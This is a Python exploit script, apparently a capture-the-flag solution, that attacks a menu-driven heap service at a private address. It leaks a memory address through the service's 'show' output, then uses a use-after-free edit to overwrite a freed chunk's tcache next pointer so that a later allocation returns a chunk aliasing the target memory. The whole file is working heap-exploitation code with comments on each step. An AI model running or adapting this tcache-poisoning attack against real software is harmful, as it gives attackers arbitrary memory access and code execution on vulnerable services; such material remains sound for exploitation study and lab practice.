import socket, time, re

HOST = "10.13.37.10"
PORT = 21968

class Conn:
    def __init__(self):
        self.s = socket.create_connection((HOST, PORT), timeout=5)
        self.s.settimeout(2)
    def recv(self, t=1.0):
        buf = b""
        end = time.time() + t
        while time.time() < end:
            try:
                chunk = self.s.recv(4096)
                if chunk == b"":
                    break
                buf += chunk
            except socket.timeout:
                break
        return buf
    def cmd(self, data, t=1.0):
        if isinstance(data, str):
            data = data.encode()
        self.s.sendall(data + b"\n")
        return self.recv(t)
    def close(self):
        self.s.close()

def hexdump(s):
    m = re.search(r"raw:([0-9a-f]+)", s)
    return m.group(1) if m else None

c = Conn()
print(c.recv(1.0).decode(errors="replace"))

def new(slot, ln, data):
    c.cmd("1"); c.cmd(str(slot)); c.cmd(str(ln)); return c.cmd(data)
def edit(slot, ln, data):
    c.cmd("2"); c.cmd(str(slot)); c.cmd(str(ln)); return c.cmd(data)
def free(slot):
    c.cmd("3"); return c.cmd(str(slot))
def show(slot):
    c.cmd("4"); return c.cmd(str(slot))

r = new(0, 16, "A"*16)
print("new slot0:", r.decode(errors="replace"))

s0 = show(0).decode(errors="replace")
h0 = hexdump(s0)
print("slot0 raw:", h0)
target_bytes = bytes.fromhex(h0[64:80])
target_addr = int.from_bytes(target_bytes, "little")
print(f"TARGET candidate addr = {hex(target_addr)}")

r = free(0)
print("free slot0:", r.decode(errors="replace"))

# overwrite freed chunk's next(fd) field with target_addr (raw, little endian, no mangling)
fake_next = target_bytes  # already 8 bytes little-endian of target_addr
r = edit(0, 16, fake_next + b"\x00"*8)
print("edit slot0 (poison next):", r.decode(errors="replace"))

r = new(1, 16, "Z"*16)  # pops original slot0 chunk back; tcache head -> target_addr
print("new slot1 (pop original):", r.decode(errors="replace"))

r = new(2, 16, "P"*16)  # should now return TARGET_ADDR chunk!
print("new slot2 (should alias target):", r.decode(errors="replace"))

s2 = show(2).decode(errors="replace")
print("slot2 raw (aliasing target memory BEFORE our write):", s2)

c.close()
